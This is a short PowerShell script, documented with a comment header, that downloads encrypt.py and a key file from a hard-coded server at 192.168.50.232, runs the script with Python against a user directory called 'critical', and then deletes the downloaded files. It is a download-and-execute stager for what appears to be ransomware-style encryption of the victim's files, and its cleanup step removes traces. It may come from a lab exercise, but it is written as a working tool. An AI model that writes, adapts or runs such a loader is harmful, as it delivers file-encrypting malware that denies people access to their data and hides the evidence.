<#
.SYNOPSIS
    Downloads and executes the encrypt.py script from a remote server.
    It also downloads the encryption key and cleans up the downloaded files afterwards.
.DESCRIPTION
    This script first downloads the encrypt.py Python script and the key.txt
    file containing the encryption key from the specified URLs to the temporary
    directory of the current user. It then changes the current directory to the
    temporary directory and executes the downloaded encrypt.py script using
    the Python interpreter. After the script execution, it changes back to the
    original directory and removes both the downloaded Python script and the
    key file from the temporary directory.
.PARAMETER url
    The URL of the encrypt.py Python script to download.
.PARAMETER key_url
    The URL of the key.txt file containing the encryption key.
.PARAMETER target_dir
    The target directory on the local machine that the encrypt.py script will operate on.
    Note: This parameter is defined within the script but might be used by the
          remote encrypt.py script.
.EXAMPLE
    .\encrypt_remote.ps1 -url "http://192.168.50.232:8080/encrypt.py" -key_url "http://192.168.50.232:8080/key.txt"
#>
# Define the URL for the encrypt.py script
$url = "http://192.168.50.232:8080/encrypt.py"
# Define the URL for the key.txt file
$key_url = "http://192.168.50.232:8080/key.txt"
# Define the local path to save the downloaded encrypt.py script in the temporary directory
$save_path = "$env:TEMP\encrypt.py"
# Define the local path to save the downloaded key.txt file in the temporary directory
$key_path = "$env:TEMP\key.txt"
# Define the target directory that the encrypt.py script will likely encrypt
$target_dir = "C:\Users\Nagesh Goud Karinga\critical"

# Download the encrypt.py file from the specified URL and save it to the temporary directory
Invoke-WebRequest -Uri $url -OutFile $save_path

# Download the key.txt file from the specified URL and save it to the temporary directory
Invoke-WebRequest -Uri $key_url -OutFile $key_path

# Change the current PowerShell working directory to the temporary directory
cd $env:TEMP

# Execute the downloaded encrypt.py script using the Python interpreter
python $save_path

# Change the current PowerShell working directory back to the original directory
cd $PWD

# Remove the downloaded encrypt.py file from the temporary directory
Remove-Item $save_path -Force
# Remove the downloaded key.txt file from the temporary directory
Remove-Item $key_path -Force